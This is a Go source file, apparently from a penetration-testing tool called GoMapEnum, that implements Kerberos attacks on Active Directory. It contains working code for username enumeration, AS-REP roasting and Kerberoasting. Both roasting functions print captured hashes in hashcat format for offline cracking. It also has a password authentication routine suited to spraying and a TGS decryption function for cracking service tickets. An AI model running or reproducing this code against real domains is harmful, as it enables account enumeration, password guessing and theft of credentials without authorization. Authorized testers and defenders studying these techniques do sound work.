package kerberos

import (
	"GoMapEnum/src/utils"
	"bytes"
	"encoding/hex"
	"fmt"
	"html/template"
	"os"
	"strings"
	"unicode/utf16"

	kclient "github.com/nodauf/gokrb5/v8/client"
	kconfig "github.com/nodauf/gokrb5/v8/config"
	"github.com/nodauf/gokrb5/v8/iana/errorcode"
	"github.com/nodauf/gokrb5/v8/messages"
	"golang.org/x/crypto/md4"
)

const krb5ConfigTemplateDNS = `[libdefaults]
dns_lookup_kdc = true
default_realm = {{.Realm}}
`

const krb5ConfigTemplateKDC = `[libdefaults]
default_realm = {{.Realm}}
[realms]
{{.Realm}} = {
	kdc = {{.DomainController}}
	admin_server = {{.DomainController}}
}
`

type KerbruteSession struct {
	Domain       string
	Realm        string
	Kdcs         map[int]string
	ConfigString string
	Config       *kconfig.Config
	Verbose      bool
	SafeMode     bool
	HashFile     *os.File
}

type KerbruteSessionOptions struct {
	Domain           string
	DomainController string
	Verbose          bool
	SafeMode         bool
	Downgrade        bool
	HashFilename     string
}

func (options *Options) testUsername(username string) (bool, error) {

	cl := kclient.NewWithPassword(username, options.Domain, utils.RandomString(5), options.kerberosConfig, kclient.DisablePAFXFAST(true), kclient.Proxy(options.ProxyTCP))
	req, err := messages.NewASReqForTGT(cl.Credentials.Domain(), cl.Config, cl.Credentials.CName())
	if err != nil {
		options.Log.Error(err.Error())
	}
	b, err := req.Marshal()
	if err != nil {
		return false, err
	}
	rb, err := cl.SendToKDC(b, options.Domain)

	if err == nil {
		// If no error, we actually got an AS REP, meaning user does not have pre-auth required
		var ASRep messages.ASRep
		err = ASRep.Unmarshal(rb)
		if err != nil {
			// something went wrong, it's not a valid response
			return false, err
		}
		hash, err := asRepToHashcat(ASRep)
		if err != nil {
			options.Log.Debug("[!] Got encrypted TGT for %s, but couldn't convert to hash: %s", ASRep.CName.PrincipalNameString(), err.Error())

		} else {
			options.Log.Success("[+] %s has no pre auth required. Dumping hash to crack offline:\n%s", ASRep.CName.PrincipalNameString(), hash)
		}

		return true, nil
	}
	e, ok := err.(messages.KRBError)
	if !ok {
		return false, err
	}
	switch e.ErrorCode {
	case errorcode.KDC_ERR_PREAUTH_REQUIRED:
		return true, nil
	case errorcode.KDC_ERR_CLIENT_REVOKED:
		return true, err
	default:
		return false, err

	}
}

func (options *Options) authenticate(username, password string) (bool, *kclient.Client, error) {
	valid := false
	client := kclient.NewWithPassword(username, options.Domain, password, options.kerberosConfig, kclient.DisablePAFXFAST(true), kclient.Proxy(options.ProxyTCP))

	if ok, err := client.IsConfigured(); !ok {
		return valid, client, err
	}
	err := client.Login()
	if err == nil {
		valid = true
		return valid, client, err
	}
	eString := err.Error()
	if strings.Contains(eString, "Password has expired") {
		// user's password expired, but it's valid!
		valid = true
	}
	if strings.Contains(eString, "Clock skew too great") {
		// clock skew off, but that means password worked since PRE-AUTH was successful
		valid = true
	}
	return valid, client, err
}

// kerberoasting get the service ticket of a SPN
func kerberoasting(cl *kclient.Client, username, spn string) string {
	// Just test kerberoasting
	ticket, _, _ := cl.GetServiceTicket(spn)
	switch ticket.EncPart.EType {
	case 23:
		return fmt.Sprintf("$krb5tgs$%d$*%s$%s$%s*$%s$%s\n", ticket.EncPart.EType, username, ticket.Realm, strings.ReplaceAll(spn, ":", "~"), hex.EncodeToString(ticket.EncPart.Cipher[0:16]), hex.EncodeToString(ticket.EncPart.Cipher[16:]))

	}
	return ""
}

func buildKrb5Template(realm, domainController string) string {
	data := map[string]interface{}{
		"Realm":            realm,
		"DomainController": domainController,
	}
	var kTemplate string
	if domainController == "" {
		kTemplate = krb5ConfigTemplateDNS
	} else {
		kTemplate = krb5ConfigTemplateKDC
	}
	t := template.Must(template.New("krb5ConfigString").Parse(kTemplate))
	builder := &strings.Builder{}
	if err := t.Execute(builder, data); err != nil {
		panic(err)
	}
	return builder.String()
}

// handleKerbError return a boolean to indicate if the error is important or only a debug and rewrite the error string
func handleKerbError(err error) (bool, string) {
	eString := err.Error()
	// handle non KRB errors
	if strings.Contains(eString, "client does not have a username") {
		return true, "Skipping blank username"
	}
	if strings.Contains(eString, "Networking_Error: AS Exchange Error") {
		return false, "NETWORK ERROR - Can't talk to KDC. Aborting..."
	}
	if strings.Contains(eString, " AS_REP is not valid or client password/keytab incorrect") {
		return true, "Got AS-REP (no pre-auth) but couldn't decrypt - bad password"
	}

	// handle KRB errors
	if strings.Contains(eString, "KDC_ERR_WRONG_REALM") {
		return false, "KDC ERROR - Wrong Realm. Try adjusting the domain? Aborting..."
	}
	if strings.Contains(eString, "KDC_ERR_C_PRINCIPAL_UNKNOWN") {
		return true, "User does not exist"
	}
	if strings.Contains(eString, "KDC_ERR_PREAUTH_FAILED") {
		return true, "Invalid password"
	}
	// Revoked can be a lot of different errors. The error have be enrich
	if strings.Contains(eString, "KDC_ERR_CLIENT_REVOKED") {
		// If the error has detailed information
		if strings.Split(eString, "-")[1] != "" {
			return true, strings.TrimSpace(strings.Split(eString, "-")[1])
		}
		return true, "USER LOCKED OUT"
	}
	if strings.Contains(eString, " AS_REP is not valid or client password/keytab incorrect") {
		return true, "Got AS-REP (no pre-auth) but couldn't decrypt - bad password"
	}
	if strings.Contains(eString, "KRB_AP_ERR_SKEW Clock skew too great") {
		return true, "Clock skew too great"
	}
	if strings.Contains(eString, "Password has expired") {
		return true, eString
	}

	return false, eString
}

// credits https://github.com/ropnop/kerbrute/blob/9cfb81e4fab8037acb44c678773ca3f93bc2b39c/util/hash.go#L9
func asRepToHashcat(asrep messages.ASRep) (string, error) {
	return fmt.Sprintf("$krb5asrep$%d$%s@%s:%s$%s",
		asrep.EncPart.EType,
		asrep.CName.PrincipalNameString(),
		asrep.CRealm,
		hex.EncodeToString(asrep.EncPart.Cipher[:16]),
		hex.EncodeToString(asrep.EncPart.Cipher[16:])), nil
}

// credits: https://github.com/leechristensen/tgscrack/blob/master/tgscrack.go
func decryptTGS(encryptionPartHex, checksumHex, password string) (bool, error) {

	checksum, _ := hex.DecodeString(checksumHex)
	encryptionPart, _ := hex.DecodeString(encryptionPartHex)

	// Convert the password to NTLM
	cipher := md4.New()
	encoded := utf16.Encode([]rune(password))
	// TODO: I'm sure there is an easier way to do the conversion from utf16 to bytes
	result := make([]byte, len(encoded)*2)
	for i := 0; i < len(encoded); i++ {
		result[i*2] = byte(encoded[i])
		result[i*2+1] = byte(encoded[i] << 8)
	}
	cipher.Write(result)
	ntlm := cipher.Sum(nil)

	// Decrypt the encryptionPart
	messageType := byte(2)
	mtype := []byte{messageType, 0, 0, 0}

	K1 := utils.GetHmacMd5(mtype, ntlm)
	K2 := K1 // Not necessary since we're not doing exports, but whatev
	K3 := utils.GetHmacMd5(checksum, K1)
	decData, _ := utils.RC4Decrypt(encryptionPart, K3)

	// TODO: (Optimization) Get rid of last HMAC. Instead verify domain or check for a consistent value in decrypted service ticket
	verifyChecksum := utils.GetHmacMd5(decData, K2)

	return bytes.Equal(verifyChecksum, checksum), nil

}
